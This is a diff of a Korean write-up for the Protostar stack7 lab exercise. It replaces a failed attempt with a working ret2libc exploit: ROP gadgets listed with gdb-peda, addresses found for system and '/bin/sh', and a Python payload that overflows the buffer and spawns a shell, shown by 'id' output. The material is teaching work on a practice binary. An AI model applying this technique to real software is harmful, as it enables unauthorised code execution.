@@ -475,38 +475,32 @@ int main(int argc, char **argv)
 알아야하는 것 : *peda*, *ROP*
 
 ```
-$ objdump -d /opt/protostar/bin/stack7 | grep ret
- 8048383: c3                    ret
- 8048494: c3                    ret
- 80484c2: c3                    ret
- 8048544: c3                    ret
- 8048553: c3                    ret
- 8048564: c3                    ret
- 80485c9: c3                    ret
- 80485cd: c3                    ret
- 80485f9: c3                    ret
- 8048617: c3                    ret
+gdb-peda$ ropgadget
+ret = 0x8048362   <== 선택
+popret = 0x8048493
+pop3ret = 0x80485c6
+pop2ret = 0x8048492
+pop4ret = 0x80485c5
+addesp_12 = 0x804848f
+addesp_44 = 0x80485c2
 ```
 
 ```
-(gdb) print system
-$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e4e310 <__libc_system>
 ```
 
 ```
-(local)gdb-peda$ find "/bin/sh"
+gdb-peda$ find "/bin/sh"
 Searching for '/bin/sh' in: None ranges
 Found 1 results, display max 1 items:
 libc : 0xf7f70bac ("/bin/sh")
-
 ```
 
 ```
-$ (python -c 'print "A"*80+"\x83\x83\x04\x08"+"\xb0\xff\xec\xb7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
-input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA����AAAA�
-                                                                                                                  ��
-Segmentation fault
-
+$ (python -c 'print "A"*80+"\x62\x83\x04\x08"+"\x10\xe3\xe4\xf7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb�AAAAAAAAAAAAb����AAAA�
+                                                                                                                     �
+id
+uid=1000(sparkling) gid=1000(sparkling) groups=1000(sparkling),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
 ```
-
-왜 안되는 걸까요...@_@;;
